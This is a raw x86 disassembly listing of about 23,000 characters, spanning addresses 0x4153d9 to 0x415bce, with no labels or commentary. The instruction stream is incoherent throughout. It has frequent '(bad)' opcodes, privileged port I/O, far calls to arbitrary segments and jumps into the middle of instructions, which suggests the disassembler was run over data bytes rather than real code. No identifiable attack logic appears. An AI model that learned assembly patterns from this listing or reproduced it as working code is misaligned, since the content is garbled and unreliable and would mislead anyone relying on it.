  4153d9:	and    ebx,DWORD PTR [edi-0x5c19952f]
  4153df:	adc    ebp,DWORD PTR [ecx]
  4153e1:	add    BYTE PTR [ebx+0x3351d757],ah
  4153e7:	lahf   
  4153e8:	xchg   edi,eax
  4153e9:	push   ebp
  4153ea:	mov    dl,0x7a
  4153ec:	pop    edx
  4153ed:	pop    ebp
  4153ee:	mov    al,ds:0xb7b05300
  4153f3:	dec    ecx
  4153f4:	or     eax,0x95697bf6
  4153f9:	sub    esi,DWORD PTR [esi+0x37ebc119]
  4153ff:	xor    bl,al
  415401:	mov    WORD PTR [edi-0x16f4f3da],es
  415407:	std    
  415408:	mov    dh,0x7f
  41540a:	and    BYTE PTR [ebx+0x6f],bh
  41540d:	out    0x94,al
  41540f:	sti    
  415410:	jo     0x4153f5
  415412:	mov    ds:0xa931803f,eax
  415417:	mov    BYTE PTR [ebx+0x24cdf2f],ah
  41541d:	nop
  41541e:	(bad)  
  415420:	pop    ebp
  415421:	test   BYTE PTR [ebp-0x457308c9],dh
  415427:	cmp    al,0x55
  415429:	test   BYTE PTR [eax],bl
  41542b:	je     0x4153c0
  41542d:	cdq    
  41542e:	cli    
  41542f:	(bad)  
  415430:	sub    ebx,DWORD PTR [ecx]
  415432:	mov    ecx,0x74100649
  415437:	mov    al,0xbf
  415439:	out    dx,eax
  41543a:	test   eax,0xce2cccf9
  41543f:	call   0xdef4:0x7eac98df
  415446:	mov    eax,ds:0xeadbc956
  41544b:	pop    ds
  41544c:	add    BYTE PTR [ecx-0x3e],dh
  41544f:	in     al,0x3d
  415451:	cvtpi2ps xmm0,mm2
  415454:	iret   
  415455:	stc    
  415456:	dec    edx
  415457:	push   esp
  415458:	dec    ebp
  415459:	retf   0x713a
  41545c:	dec    edx
  41545d:	adc    eax,0x2d05049b
  415462:	cmc    
  415463:	cmp    DWORD PTR [ebx-0x7b],0xffffff9a
  415467:	je     0x4154d7
  415469:	or     ecx,DWORD PTR [ebx+edx*4]
  41546c:	fisttp WORD PTR [ebx-0x7febfc57]
  415472:	shr    bh,0xdc
  415475:	out    0xa7,eax
  415477:	mov    bh,0x38
  415479:	push   ss
  41547a:	ja     0x4154ca
  41547c:	popa   
  41547d:	jne    0x41546d
  41547f:	cmp    ebx,ecx
  415481:	dec    edi
  415482:	jbe    0x4154a1
  415484:	fcmove st,st(5)
  415486:	in     eax,dx
  415487:	test   BYTE PTR [ebp+0x73c0af70],bh
  41548d:	into   
  41548e:	test   DWORD PTR [edx+0x5a],eax
  415491:	sub    DWORD PTR [ecx],esp
  415493:	enter  0xe079,0xcb
  415497:	lahf   
  415498:	nop
  415499:	push   0x1a7072be
  41549e:	push   ecx
  41549f:	std    
  4154a0:	(bad)  
  4154a1:	cmp    al,0xdd
  4154a3:	mov    WORD PTR cs:[ebx-0x4d],ds
  4154a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154a8:	mov    al,0x96
  4154aa:	fistp  WORD PTR [edx-0x80]
  4154ad:	es nop
  4154af:	imul   ebp,DWORD PTR [edi-0x5b],0x8
  4154b3:	shr    DWORD PTR [ecx+0x21],1
  4154b6:	and    BYTE PTR [ebp+0x77777bd6],ah
  4154bc:	jge    0x4154d2
  4154be:	imul   DWORD PTR [ecx-0x5c64bd4e]
  4154c4:	pop    ebp
  4154c5:	add    ch,BYTE PTR [eax]
  4154c7:	daa    
  4154c8:	jp     0x41548e
  4154ca:	lock jmp 0x95828cad
  4154d0:	aaa    
  4154d1:	aad    0xab
  4154d3:	mov    DWORD PTR [ebx+0x31],0x4eb3dd2f
  4154da:	and    DWORD PTR [ebx],esi
  4154dc:	dec    esi
  4154dd:	mov    esi,0xb6e165fd
  4154e2:	cmc    
  4154e3:	xlat   BYTE PTR ds:[ebx]
  4154e4:	cmc    
  4154e5:	cmp    BYTE PTR [edi-0x315a1c6f],ch
  4154eb:	dec    edi
  4154ec:	and    eax,0xf02f3bff
  4154f1:	pop    ebx
  4154f2:	mov    eax,0xfd3bae50
  4154f7:	xor    al,0x32
  4154f9:	inc    esi
  4154fa:	int3   
  4154fb:	pop    eax
  4154fc:	ret    
  4154fd:	or     ah,bh
  4154ff:	jns    0x415556
  415501:	mov    ecx,0x1fa94839
  415506:	mov    edx,0x7858c5bb
  41550b:	ja     0x41553b
  41550d:	jge    0x4154db
  41550f:	ret    0x5f61
  415512:	repz mov esp,0x41ecad3c
  415518:	mov    ebx,0x1a61ec46
  41551d:	jecxz  0x41553d
  41551f:	xor    ch,dl
  415521:	mov    eax,0xccf10304
  415526:	and    eax,0xee55b650
  41552b:	mov    bh,0xde
  41552d:	mov    al,ds:0x3bbb5424
  415532:	cs jp  0x4154c1
  415535:	inc    ecx
  415536:	adc    BYTE PTR [esp+ebx*4-0x5a],0xe0
  41553b:	mov    bl,0x23
  41553d:	sbb    bh,BYTE PTR [ecx]
  41553f:	das    
  415540:	jnp    0x415596
  415542:	xor    DWORD PTR [eax+0x17],0xbf861df5
  415549:	pop    edx
  41554a:	pop    ebx
  41554b:	lods   eax,DWORD PTR ds:[esi]
  41554c:	cmp    al,0x6e
  41554e:	fsub   QWORD PTR [edi-0x7a291914]
  415554:	sbb    DWORD PTR [edi+0x29],eax
  415557:	jmp    0x415512
  415559:	ss sub eax,0x40cedf0e
  41555f:	lods   al,BYTE PTR ds:[esi]
  415560:	add    ebp,DWORD PTR [eax]
  415562:	pusha  
  415563:	sub    DWORD PTR [edi],edx
  415565:	shufpd xmm1,XMMWORD PTR [ebx+0x7e],0xa1
  41556b:	sbb    esp,edi
  41556d:	xor    ch,bl
  41556f:	or     eax,0xd511b9f5
  415574:	xchg   esp,eax
  415575:	push   edi
  415576:	shr    esp,cl
  415578:	add    BYTE PTR [ebp+edx*4-0x7fc50fa5],0xcc
  415580:	push   ebp
  415581:	inc    ecx
  415582:	data16 jle 0x4155db
  415585:	out    dx,eax
  415586:	(bad)  
  415587:	and    DWORD PTR [esi-0x2f],ecx
  41558a:	in     al,dx
  41558b:	inc    ebx
  41558c:	je     0x4155a9
  41558e:	int    0xd1
  415590:	inc    esp
  415591:	push   ecx
  415592:	retf   
  415593:	call   0xf5f5:0x35542cad
  41559a:	or     cl,BYTE PTR [ebp-0x16]
  41559d:	test   DWORD PTR [ecx+0x56],edi
  4155a0:	sbb    ah,BYTE PTR [ebp+edi*1-0x207585d6]
  4155a7:	push   ebp
  4155a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155a9:	fs mov ebx,0x22f2710
  4155af:	in     al,dx
  4155b0:	sub    ah,BYTE PTR [edx-0x60842c59]
  4155b6:	push   0x3f
  4155b8:	sti    
  4155b9:	data16 jle 0x4155a4
  4155bc:	adc    dh,BYTE PTR [edx]
  4155be:	enter  0x2f08,0x44
  4155c2:	repz add eax,0x1319887e
  4155c8:	sbb    ah,BYTE PTR [edi]
  4155ca:	add    eax,0x33e6f7f0
  4155cf:	push   es
  4155d0:	xor    cl,BYTE PTR [ebx-0x48]
  4155d3:	test   ebp,ebx
  4155d5:	aaa    
  4155d6:	mov    al,0xe4
  4155d8:	cwde   
  4155d9:	test   BYTE PTR [edx+eiz*8],cl
  4155dc:	xor    DWORD PTR [eax-0x7d],ecx
  4155df:	fwait
  4155e0:	and    BYTE PTR [edi],0x9b
  4155e3:	sbb    al,0x12
  4155e5:	(bad)  gs:[ecx+0x13b59927]
  4155ec:	ja     0x4155af
  4155ee:	cmp    DWORD PTR [ebp+edi*8+0x76d8abd2],ecx
  4155f5:	adc    al,BYTE PTR [esi]
  4155f7:	das    
  4155f8:	jge    0x4155dc
  4155fa:	and    edx,ecx
  4155fc:	sub    esp,DWORD PTR [ebx+ebp*2]
  4155ff:	lods   al,BYTE PTR ds:[esi]
  415600:	call   DWORD PTR [edx-0x7c]
  415603:	bound  eax,QWORD PTR [eax-0x1c]
  415606:	and    al,BYTE PTR [eax+0x30]
  415609:	sar    dl,0xa0
  41560c:	jo     0x4155c5
  41560e:	dec    eax
  41560f:	xor    eax,0xd7bc8d1c
  415614:	or     al,0x2b
  415616:	xchg   esi,eax
  415617:	adc    al,0xf8
  415619:	sub    eax,0x89f76340
  41561e:	stos   BYTE PTR es:[edi],al
  41561f:	mov    esp,0xe8ce1a67
  415624:	xchg   edx,eax
  415625:	mov    ecx,DWORD PTR [ebx+0x25da3416]
  41562b:	out    0x3,eax
  41562d:	sahf   
  41562e:	pusha  
  41562f:	shl    DWORD PTR [ebx+0x6bcd2b0d],0xed
  415636:	or     eax,0x75569292
  41563b:	add    al,0x71
  41563d:	aad    0x42
  41563f:	in     al,dx
  415640:	pop    ebp
  415641:	cld    
  415642:	lds    ecx,FWORD PTR [ebx]
  415644:	fsubrp st(7),st
  415646:	or     al,0xe8
  415648:	(bad)  
  415649:	jno    0x4155d7
  41564b:	mov    edx,0x3a7e11c9
  415650:	sbb    al,BYTE PTR [ebp-0x5c]
  415653:	and    DWORD PTR [edx],0xf7870525
  415659:	loopne 0x4156c5
  41565b:	xchg   esi,eax
  41565c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41565d:	scas   al,BYTE PTR es:[edi]
  41565e:	and    dl,BYTE PTR [edi+edx*2-0x9]
  415662:	scas   eax,DWORD PTR es:[edi]
  415663:	gs pushf 
  415665:	ret    0xf027
  415668:	fild   DWORD PTR [ebp-0x26]
  41566b:	lods   eax,DWORD PTR ds:[esi]
  41566c:	lea    edx,[ebx]
  41566e:	pop    es
  41566f:	sar    esp,1
  415671:	call   0xc4afc2fd
  415676:	dec    ebp
  415677:	jmp    0x6fb6:0xa8f87e6b
  41567e:	jns    0x415677
  415680:	shr    dh,0x36
  415683:	mov    esp,0xc6f6325d
  415688:	cmp    esi,DWORD PTR [edx+0x11cd52f]
  41568e:	or     ah,BYTE PTR [edx]
  415690:	push   edi
  415691:	dec    ebp
  415692:	mov    ds:0x7f393179,al
  415697:	dec    ecx
  415698:	xor    ch,BYTE PTR [ecx+ebx*2+0x4918ea2b]
  41569f:	xor    DWORD PTR [ebx-0x1f925119],edx
  4156a5:	and    BYTE PTR [ebp+esi*2-0x689d658f],bh
  4156ac:	jno    0x4156e4
  4156ae:	mov    bl,0xcc
  4156b0:	clc    
  4156b1:	mov    al,0xd5
  4156b3:	imul   ebx,DWORD PTR [eax+ebp*2+0x4f],0xffffff92
  4156b8:	jne    0x41565b
  4156ba:	cdq    
  4156bb:	cli    
  4156bc:	xor    bh,cl
  4156be:	and    al,0xf0
  4156c0:	outs   dx,DWORD PTR ds:[esi]
  4156c1:	ret    
  4156c2:	push   cs
  4156c3:	cmp    eax,0x7899378d
  4156c8:	push   ss
  4156c9:	push   0x2b59fac4
  4156ce:	outs   dx,DWORD PTR ds:[esi]
  4156cf:	push   edx
  4156d0:	jb     0x4156bb
  4156d2:	inc    ebp
  4156d3:	jmp    0xd4f2bd08
  4156d8:	mov    ebx,0x5bdfa600
  4156dd:	test   DWORD PTR [ebx],esp
  4156df:	inc    edi
  4156e0:	push   ebp
  4156e1:	push   0xffffffc4
  4156e3:	sbb    bh,BYTE PTR [edi-0x73c00159]
  4156e9:	stc    
  4156ea:	xchg   dl,dh
  4156ec:	jl     0x4156c7
  4156ee:	mov    eax,ds:0xcb75c8e7
  4156f3:	fwait
  4156f4:	aaa    
  4156f5:	pusha  
  4156f6:	ret    
  4156f7:	test   al,0x41
  4156f9:	pop    edi
  4156fa:	inc    DWORD PTR [esi+0x57]
  4156fd:	adc    al,0x77
  4156ff:	icebp  
  415700:	mov    ecx,esi
  415702:	sbb    esi,edx
  415704:	cmp    DWORD PTR [esi+ecx*8-0x4fd4f0d],edx
  41570b:	jno    0x41571f
  41570d:	cmp    ch,BYTE PTR ds:[edx+edi*2]
  415711:	out    dx,al
  415712:	jmp    0xea50ba7a
  415717:	sub    eax,0x43e17995
  41571c:	ret    0x8c79
  41571f:	mov    eax,ds:0xb05965ed
  415724:	lahf   
  415725:	add    BYTE PTR [edx-0x33],dl
  415728:	lods   eax,DWORD PTR ds:[esi]
  415729:	aad    0x21
  41572b:	add    eax,0x17532000
  415730:	cwde   
  415731:	dec    edi
  415732:	and    eax,DWORD PTR [ecx-0x335f7c76]
  415738:	or     eax,0xea1301d8
  41573d:	mov    ds:0x15357834,eax
  415742:	xchg   dl,al
  415744:	pop    esp
  415745:	shl    DWORD PTR [esi],1
  415747:	jns    0x415709
  415749:	shl    DWORD PTR fs:[esi],0x46
  41574d:	sub    al,0x28
  41574f:	sub    dh,BYTE PTR [esi-0x76b8c09a]
  415755:	in     al,0xcc
  415757:	nop
  415758:	sbb    BYTE PTR [eax+0x6f],bl
  41575b:	mov    ?,WORD PTR [esi]
  41575d:	div    BYTE PTR [esi+0x60]
  415760:	jns    0x4157a0
  415762:	cmc    
  415763:	mov    ah,BYTE PTR [ecx+0x50]
  415766:	test   BYTE PTR [edi+0x7e90099b],bl
  41576c:	adc    dl,al
  41576e:	sti    
  41576f:	cli    
  415770:	imul   eax,DWORD PTR ds:0x2818213c,0x12d9162b
  41577a:	push   es
  41577b:	out    0x81,eax
  41577d:	xchg   DWORD PTR [edx+ecx*4],eax
  415780:	ficom  DWORD PTR [eax]
  415782:	sub    cl,BYTE PTR [ebx]
  415784:	mov    eax,0x54234b5c
  415789:	or     dh,dh
  41578b:	or     BYTE PTR [ecx+0x4c0cfd32],bl
  415791:	pushf  
  415792:	mov    ebx,0x5a0e96cb
  415797:	push   0x45
  415799:	dec    edi
  41579a:	out    dx,eax
  41579b:	stc    
  41579c:	xlat   BYTE PTR ds:[ebx]
  41579d:	pop    ebx
  41579e:	mov    dh,0xd3
  4157a0:	clc    
  4157a1:	fisub  WORD PTR [ebx+0x35dda79f]
  4157a7:	or     al,BYTE PTR [eax]
  4157a9:	and    eax,0x337fe5a0
  4157ae:	pop    esp
  4157af:	hlt    
  4157b0:	int3   
  4157b1:	sub    al,al
  4157b3:	sbb    eax,0x3f5a6408
  4157b8:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4157ba:	push   ss
  4157bb:	inc    ebp
  4157bc:	xchg   DWORD PTR [edx-0x1b98bb7e],ebp
  4157c2:	lahf   
  4157c3:	push   esp
  4157c4:	fld    QWORD PTR [ebx+0x59]
  4157c7:	retf   
  4157c8:	mov    al,ds:0xd23871ea
  4157cd:	sahf   
  4157ce:	js     0x41575c
  4157d0:	ins    BYTE PTR es:[edi],dx
  4157d1:	pop    edx
  4157d2:	mov    bl,0xba
  4157d4:	enter  0x37d1,0xba
  4157d8:	out    0x3f,al
  4157da:	ins    BYTE PTR es:[di],dx
  4157dc:	dec    ecx
  4157dd:	shl    bh,cl
  4157df:	and    eax,0x9853b834
  4157e4:	div    BYTE PTR [ebp+0x56]
  4157e7:	jl     0x415808
  4157e9:	cmp    dh,BYTE PTR [esi]
  4157eb:	dec    edx
  4157ec:	or     esi,DWORD PTR [edi+0x29c2c2df]
  4157f2:	add    DWORD PTR [ebx-0x62],0x26
  4157f6:	mov    dl,0x9c
  4157f8:	fist   WORD PTR [ebx]
  4157fa:	sbb    DWORD PTR [ecx+0x345da6f4],esp
  415800:	jnp    0x41585c
  415802:	jmp    0x41586d
  415804:	jns    0x415833
  415806:	dec    esp
  415807:	jp     0x415801
  415809:	dec    esi
  41580a:	pop    edi
  41580b:	gs ja  0x4157b8
  41580e:	call   0xaa363bf3
  415813:	mov    bh,cl
  415815:	adc    DWORD PTR [ecx],0xa1f3af80
  41581b:	ds jo  0x4157d0
  41581e:	jmp    ebp
  415820:	add    dl,dh
  415822:	xor    al,0x4b
  415824:	lea    esi,[edi+0x4a]
  415827:	jnp    0x41583a
  415829:	xchg   al,dh
  41582b:	repnz lock and al,0xbf
  41582f:	out    0x45,al
  415831:	shr    cl,0x30
  415834:	sar    BYTE PTR [edi],0xed
  415837:	pop    ecx
  415838:	(bad)
  41583b:	jne    0x415847
  41583d:	sub    cl,BYTE PTR [ebx]
  41583f:	aam    0x65
  415841:	mov    ecx,cs
  415843:	mov    dh,0xd6
  415845:	dec    edi
  415846:	pop    edi
  415847:	test   eax,0x6fb5574f
  41584c:	stos   BYTE PTR es:[edi],al
  41584d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41584e:	add    DWORD PTR [ecx+0x5d],0xfd39b1f7
  415855:	popf   
  415856:	mov    esi,0x57e56ab5
  41585b:	adc    eax,0x40ce72d7
  415860:	dec    ecx
  415861:	pop    ecx
  415862:	aas    
  415863:	xchg   ecx,eax
  415864:	pop    eax
  415865:	jmp    0x37aa35ab
  41586a:	sbb    ebp,DWORD PTR [edi+0x3ad77a77]
  415870:	cmp    edi,0xf1d0b226
  415876:	out    dx,al
  415877:	add    ecx,DWORD PTR [eax]
  415879:	aas    
  41587a:	cmp    BYTE PTR ds:0xed3f915c,0xaa
  415881:	push   edi
  415882:	mov    edx,0x6841ac5b
  415887:	jnp    0x415833
  415889:	inc    ebp
  41588a:	pop    ebp
  41588b:	imul   edi,DWORD PTR [edx+0x5079d1cd],0x64c010f0
  415895:	in     al,0xc6
  415897:	pop    ebx
  415898:	push   ss
  415899:	push   esp
  41589a:	scas   al,BYTE PTR es:[edi]
  41589b:	jmp    0x415853
  41589d:	dec    ebx
  41589e:	pop    ebp
  41589f:	sti    
  4158a0:	clc    
  4158a1:	ficomp WORD PTR [eax]
  4158a3:	mov    al,ds:0x4b2ab543
  4158a8:	jmp    DWORD PTR [edx-0x12c3f335]
  4158ae:	jnp    0x415869
  4158b0:	sub    ebx,DWORD PTR [esp+edi*4+0x119114c7]
  4158b7:	sub    al,0x36
  4158b9:	str    WORD PTR [edx-0x1a]
  4158bd:	inc    ebp
  4158be:	push   ecx
  4158bf:	test   eax,0x5fbd797a
  4158c4:	inc    edi
  4158c5:	iret   
  4158c6:	dec    eax
  4158c7:	ret    0x88f3
  4158ca:	jmp    0x4158c3
  4158cc:	add    eax,esp
  4158ce:	xchg   edx,ebp
  4158d0:	xlat   BYTE PTR ds:[ebx]
  4158d1:	xchg   BYTE PTR [ecx],ch
  4158d3:	outs   dx,BYTE PTR ds:[esi]
  4158d4:	pop    edi
  4158d5:	iret   
  4158d6:	shl    esp,1
  4158d8:	test   BYTE PTR [edi+0x71],dl
  4158db:	ds mov edx,0xfd70623b
  4158e1:	in     al,0x5b
  4158e3:	sbb    eax,0x9640f838
  4158e8:	inc    edi
  4158e9:	mov    al,0xda
  4158eb:	daa    
  4158ec:	stc    
  4158ed:	js     0x4158d5
  4158ef:	(bad)  
  4158f0:	je     0x415878
  4158f2:	inc    edi
  4158f3:	lds    eax,FWORD PTR [ecx-0x57009b5]
  4158f9:	popa   
  4158fa:	mov    edx,0x704a2e08
  4158ff:	xor    eax,0x5a91b86f
  415904:	dec    edx
  415905:	push   edx
  415906:	or     eax,DWORD PTR [esi]
  415908:	mov    ah,0x53
  41590a:	xor    DWORD PTR [edi+0x48],eax
  41590d:	fiadd  DWORD PTR [esi-0x6064bb43]
  415913:	out    0x2f,eax
  415915:	hlt    
  415916:	ret    0x5f63
  415919:	les    ecx,FWORD PTR [ebx+0xae32998]
  41591f:	adc    al,0x98
  415921:	push   ebx
  415922:	dec    eax
  415923:	mov    ah,0x3d
  415925:	iret   
  415926:	out    0x8e,al
  415928:	add    dl,BYTE PTR [edi]
  41592a:	push   eax
  41592b:	(bad)  
  41592d:	sbb    al,0xe1
  41592f:	lock ret 
  415931:	mov    eax,ds:0x4193bb7d
  415936:	ja     0x415925
  415938:	sub    BYTE PTR [edx+0x18],ch
  41593b:	cmp    dl,BYTE PTR [ebp-0x18]
  41593e:	(bad)  
  41593f:	out    dx,eax
  415940:	stos   DWORD PTR es:[edi],eax
  415941:	add    DWORD PTR [esi+0x7f],ecx
  415944:	ja     0x41593d
  415946:	popa   
  415947:	cmp    al,0x23
  415949:	cmp    dl,BYTE PTR [ebx-0x2c]
  41594c:	mov    eax,0x507afa6d
  415951:	(bad)  
  415952:	lea    eax,[ebx]
  415954:	out    0xdf,eax
  415956:	mov    BYTE PTR [edi],ah
  415958:	addr16 push esp
  41595a:	not    BYTE PTR [eax+0x6942bdf1]
  415960:	out    dx,al
  415961:	cli    
  415962:	dec    esi
  415963:	xchg   esp,eax
  415964:	cdq    
  415965:	pop    ecx
  415966:	loope  0x415927
  415968:	pop    edi
  415969:	repnz pop ds
  41596b:	pop    edi
  41596c:	push   ds
  41596d:	rcl    DWORD PTR [eax+0x408c11dd],1
  415973:	xor    dh,bh
  415975:	jmp    0xf941:0x61c75252
  41597c:	pop    es
  41597d:	dec    edi
  41597e:	cld    
  41597f:	mov    ebp,0xa55963d
  415984:	dec    eax
  415985:	call   0x3b56:0x19f22fa3
  41598c:	sub    ebp,ebx
  41598e:	dec    edi
  41598f:	pusha  
  415990:	fsub   QWORD PTR [esi+0x5fb984fb]
  415996:	push   0x4fbe589f
  41599b:	push   ebp
  41599c:	pop    esp
  41599d:	sub    al,BYTE PTR [ebp-0x242c54bf]
  4159a3:	scas   eax,DWORD PTR es:[edi]
  4159a4:	sub    edi,ebx
  4159a6:	loop   0x4159a9
  4159a8:	inc    ebx
  4159a9:	lods   al,BYTE PTR ds:[esi]
  4159aa:	xor    al,ah
  4159ac:	push   ebp
  4159ad:	fld    TBYTE PTR es:[esi+0x7c]
  4159b2:	cwde   
  4159b3:	or     BYTE PTR [esi-0x7eaa956f],al
  4159b9:	call   0x258e4e36
  4159be:	push   edx
  4159bf:	inc    esi
  4159c0:	sbb    eax,0xddb751ee
  4159c5:	and    eax,0x284a180e
  4159ca:	jg     0x4159a8
  4159cc:	out    dx,eax
  4159cd:	push   es
  4159ce:	(bad)  
  4159cf:	jp     0x415963
  4159d1:	or     al,0x39
  4159d3:	pop    esp
  4159d4:	push   es
  4159d5:	and    BYTE PTR [edx-0x3fc977ee],dh
  4159db:	dec    esi
  4159dc:	jmp    0x90ff:0xaf146b8e
  4159e3:	jne    0x415988
  4159e5:	fidiv  DWORD PTR [edx+0x27]
  4159e8:	xor    al,0xa8
  4159ea:	bound  ecx,QWORD PTR [ebx]
  4159ec:	scas   eax,DWORD PTR es:[edi]
  4159ed:	fs test al,0xe7
  4159f0:	js     0x415974
  4159f2:	adc    DWORD PTR [ecx+0x9312a21],ecx
  4159f8:	imul   BYTE PTR [esi-0x7b]
  4159fb:	or     al,0xed
  4159fd:	add    BYTE PTR [edi+0x43],ah
  415a00:	repz (bad) 
  415a02:	fmul   DWORD PTR [eax]
  415a04:	and    ebp,DWORD PTR [esp+edi*1-0x4be6c480]
  415a0b:	dec    edx
  415a0c:	out    dx,eax
  415a0d:	inc    ecx
  415a0e:	dec    edx
  415a0f:	ss jae 0x415a47
  415a12:	aam    0x74
  415a14:	dec    ebx
  415a15:	jne    0x415a44
  415a17:	int3   
  415a18:	and    DWORD PTR [esi],eax
  415a1a:	pop    edx
  415a1b:	dec    ebx
  415a1c:	test   al,0xf7
  415a1e:	mov    bl,0xde
  415a20:	xlat   BYTE PTR ds:[ebx]
  415a21:	and    bh,ch
  415a23:	repnz xor BYTE PTR [ecx],bl
  415a26:	adc    eax,0x5a15d524
  415a2b:	and    ah,BYTE PTR [eax]
  415a2d:	dec    ebx
  415a2e:	rol    DWORD PTR [eax-0x6e08cb1f],1
  415a34:	push   esp
  415a35:	nop
  415a36:	xor    esp,DWORD PTR [esi-0x39]
  415a39:	dec    esi
  415a3a:	in     al,0xd3
  415a3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a3d:	ss dec ecx
  415a3f:	outs   dx,BYTE PTR ds:[esi]
  415a40:	out    dx,eax
  415a41:	xor    ch,BYTE PTR [edx+0xe]
  415a44:	dec    edi
  415a45:	(bad)  
  415a46:	dec    DWORD PTR [ebx]
  415a48:	inc    esp
  415a49:	imul   ebp,DWORD PTR [ebx],0xf655389
  415a4f:	sbb    eax,0xd93cc6c4
  415a54:	dec    esp
  415a55:	je     0x415a38
  415a57:	scas   al,BYTE PTR es:[edi]
  415a58:	jo     0x4159fd
  415a5a:	or     eax,0x6f9ee1ee
  415a5f:	in     eax,dx
  415a60:	das    
  415a61:	sahf   
  415a62:	(bad)  
  415a63:	jae    0x415a8d
  415a65:	xchg   esi,eax
  415a66:	xor    dh,ah
  415a68:	mov    esp,0xa8deeafd
  415a6d:	test   DWORD PTR [eax-0x23d0e25],edx
  415a73:	lock je 0x4159f6
  415a76:	stc    
  415a77:	sbb    eax,0x640441ae
  415a7c:	jecxz  0x415ac0
  415a7e:	popa   
  415a7f:	pop    ss
  415a80:	sub    edx,DWORD PTR [esi+0x70b16d74]
  415a86:	(bad)  
  415a88:	pop    ecx
  415a89:	or     esp,ebx
  415a8b:	cmp    bl,bh
  415a8d:	and    al,BYTE PTR [esi-0x4001a306]
  415a93:	(bad)  
  415a94:	das    
  415a95:	jns    0x415a1f
  415a97:	mov    ah,0x25
  415a99:	lods   eax,DWORD PTR ds:[esi]
  415a9a:	int    0x61
  415a9c:	push   es
  415a9d:	add    cl,BYTE PTR [ebp-0x12]
  415aa0:	xchg   edx,eax
  415aa1:	sub    DWORD PTR [ebx],edi
  415aa3:	daa    
  415aa4:	adc    bl,BYTE PTR [ecx]
  415aa6:	mov    bh,0x41
  415aa8:	mov    ah,0x38
  415aaa:	div    BYTE PTR [ebx-0x5df67c8c]
  415ab0:	mov    ecx,0x2e78e1e7
  415ab5:	and    ecx,DWORD PTR [eax]
  415ab7:	fwait
  415ab8:	out    0x2e,al
  415aba:	ss and al,0x9e
  415abd:	lgs    esp,FWORD PTR [eax-0x4627cd85]
  415ac4:	out    dx,al
  415ac5:	push   ecx
  415ac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ac7:	inc    ebp
  415ac8:	xlat   BYTE PTR ds:[ebx]
  415ac9:	std    
  415aca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415acb:	dec    ebp
  415acc:	or     ebx,esp
  415ace:	jp     0x415b28
  415ad0:	mov    ah,0x90
  415ad2:	sub    eax,0x1b10bd4e
  415ad7:	je     0x415b17
  415ad9:	lods   eax,DWORD PTR ds:[esi]
  415ada:	in     eax,dx
  415adb:	stos   BYTE PTR es:[edi],al
  415adc:	repnz pop ds
  415ade:	jl     0x415ab2
  415ae0:	fild   WORD PTR [esi]
  415ae2:	iret   
  415ae3:	(bad)  
  415ae4:	jno    0x415ad0
  415ae6:	cwde   
  415ae7:	xchg   ebx,eax
  415ae8:	dec    ebx
  415ae9:	outs   dx,DWORD PTR ds:[esi]
  415aea:	cld    
  415aeb:	adc    eax,0xa269e4d
  415af0:	(bad)  
  415af1:	mov    DWORD PTR [ebx+0x39],0xcc30ec0c
  415af8:	stos   DWORD PTR es:[edi],eax
  415af9:	inc    edi
  415afa:	pmullw mm6,QWORD PTR [ecx]
  415afd:	psllq  mm4,mm1
  415b00:	(bad)  [bx+di-0x28]
  415b04:	pop    esi
  415b05:	jecxz  0x415ac7
  415b07:	xchg   ecx,eax
  415b08:	xor    eax,0xadcb3888
  415b0d:	sbb    ebp,eax
  415b0f:	fld    TBYTE PTR [ebx]
  415b11:	mov    edx,0xd1cb8bd1
  415b16:	retf   0x3cd1
  415b19:	and    eax,0xacf98cff
  415b1e:	loop   0x415b4a
  415b20:	loope  0x415ab2
  415b22:	dec    ebx
  415b23:	repz out 0xc2,eax
  415b26:	sbb    eax,0x89fc4200
  415b2b:	push   es
  415b2c:	pop    ebx
  415b2d:	fiadd  DWORD PTR [esp+ebx*4+0x3d441b12]
  415b34:	mov    bl,0xdf
  415b36:	and    BYTE PTR [eax-0x40],0x18
  415b3a:	or     al,0x6f
  415b3c:	lock mov al,ds:0xb57caae6
  415b42:	out    dx,al
  415b43:	test   al,0x53
  415b45:	outs   dx,BYTE PTR ds:[esi]
  415b46:	inc    ecx
  415b47:	jns    0x415b8b
  415b49:	aad    0xa9
  415b4b:	pop    edi
  415b4c:	and    dl,BYTE PTR [esi]
  415b4e:	call   0x851b3239
  415b53:	and    BYTE PTR ds:0xaccdeb21,dl
  415b59:	jns    0x415b19
  415b5b:	inc    ebx
  415b5c:	dec    eax
  415b5d:	daa    
  415b5e:	xchg   ebx,eax
  415b5f:	repz jno 0x415b16
  415b62:	mov    ds:0xd1600b1c,al
  415b67:	sbb    dl,bh
  415b69:	inc    esi
  415b6a:	(bad)  
  415b6b:	mov    bh,0x77
  415b6d:	popf   
  415b6e:	and    eax,DWORD PTR [ecx+ebp*2-0x55]
  415b72:	ds cs xor al,0xa7
  415b76:	mov    edi,0xc9b5c8bf
  415b7b:	out    dx,eax
  415b7c:	push   edx
  415b7d:	repnz dec edi
  415b7f:	cmp    ebp,DWORD PTR [ebx]
  415b81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b82:	mov    esi,DWORD PTR [ecx]
  415b84:	mov    ds:0x26662bbb,al
  415b89:	mov    BYTE PTR [esi+edi*1-0x3074eaa],ch
  415b90:	mov    esp,0xef47e54e
  415b95:	xchg   edi,eax
  415b96:	int3   
  415b97:	data16 hlt 
  415b99:	imul   eax,DWORD PTR [ebx-0x31],0xffffffea
  415b9d:	mov    BYTE PTR [edi-0xf6e791e],cl
  415ba3:	(bad)  
  415ba4:	fbld   TBYTE PTR [ebp-0x5500df60]
  415baa:	and    BYTE PTR [ebx],dh
  415bac:	(bad)  
  415bad:	mov    ebx,0xfc042d62
  415bb2:	cmp    DWORD PTR [ebx-0x3c],esi
  415bb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bb6:	(bad)
  415bba:	jbe    0x415c0c
  415bbc:	lods   al,BYTE PTR ds:[esi]
  415bbd:	mov    ds:0x2e8278e6,al
  415bc2:	add    eax,0x5c82c72b
  415bc7:	(bad)  
  415bc8:	pop    esi
  415bc9:	mov    esi,0x854bc991
  415bce:	in     al,dx
